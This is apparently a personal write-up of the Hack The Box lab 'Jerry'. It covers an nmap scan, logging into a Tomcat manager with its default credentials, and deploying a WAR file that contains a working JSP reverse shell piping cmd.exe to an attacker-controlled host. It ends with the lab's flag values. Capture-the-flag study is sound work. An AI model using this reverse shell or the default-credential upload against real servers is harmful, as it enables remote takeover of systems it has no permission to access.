#easy

## 0. **Lab infos**

**Difficulty :** Easy
**Name :** Jerry
**IP** : 10.129.22.213
**Objectives :** Get the user and admin flags
**OS :** #Windows

##### **Conclusion**
**Time :** 34min
	**Start :** 23.21 / 11.04.2025
	**Break at/to :** 
	**Finish :** 23.55 / 11.04.2025
**Satisfaction :**  10/10 Very easy but no challenge
### 1. **Reconnaissance

We start with an #nmap scan :

```BASH
┌─[eu-dedivip-1]─[10.10.14.154]─[bobinette@htb-p3rcsf8a1g]─[~]
└──╼ [★]$ nmap  10.129.22.213
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-11 16:22 CDT
Nmap scan report for 10.129.22.213
Host is up (0.0076s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE
8080/tcp open  http-proxy
```

We go on the ip address with the port and we can see an TomCat app. We search some CVE but nothing interesting.

So we search for the relative path on the webserver leads to the Web Application Manager and we fin that is `/manager/html`

While we want to connect it's show us the default credentials : `tomcat:s3cret`
and it's work. We can see on the manager page that we can upload some .war file.

## 2. **Weaponization

revshell.jsp (Windows Reverse Shell) #RCE
```JSP
<%@ page import="java.io.*, java.net.*" %>
<%
String host = "YOUR_IP";
int port = YOUR_PORT;
Socket socket = new Socket(host, port);
Process process = new ProcessBuilder("cmd.exe").redirectErrorStream(true).start();
InputStream pi = process.getInputStream(), pe = process.getErrorStream(), si = socket.getInputStream();
OutputStream po = process.getOutputStream(), so = socket.getOutputStream();
while (!socket.isClosed()) {
    while (pi.available() > 0) so.write(pi.read());
    while (pe.available() > 0) so.write(pe.read());
    while (si.available() > 0) po.write(si.read());
    so.flush();
    po.flush();
    Thread.sleep(50);
    try {
        process.exitValue();
        break;
    } catch (Exception e) {}
}
process.destroy();
socket.close();
%>
```

web.xml (Minimal Deployment Descriptor)

```XML
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee" version="3.1">
    <display-name>ReverseShell</display-name>
</web-app>
```

Structure 

```
reverse-shell/
├── WEB-INF/
│   └── web.xml
└── revshell.jsp
```

WAR File Generation Command:

```BASH
jar -cvf revshell.war -C revshell/ .
```

## 3. **Delivery

We upload the .war file here :

![[Pasted image 20250412000454.png]]


## 4. **Exploitation

`nc -lvnp 4444`

We go to `http://10.129.22.213:8080/rceee/shell.jsp`

## 5. **Installation

## 6. **Command and Control

## 7. **Actions on Objectives

```POWERSHELL
C:\Users\Administrator\Desktop\flags>type "2 for the price of 1.txt"
type "2 for the price of 1.txt"
user.txt
7004dbcef0f854e0fb401875f26ebd00

root.txt
04a8b36e1545a455393d067e772fe90e
```
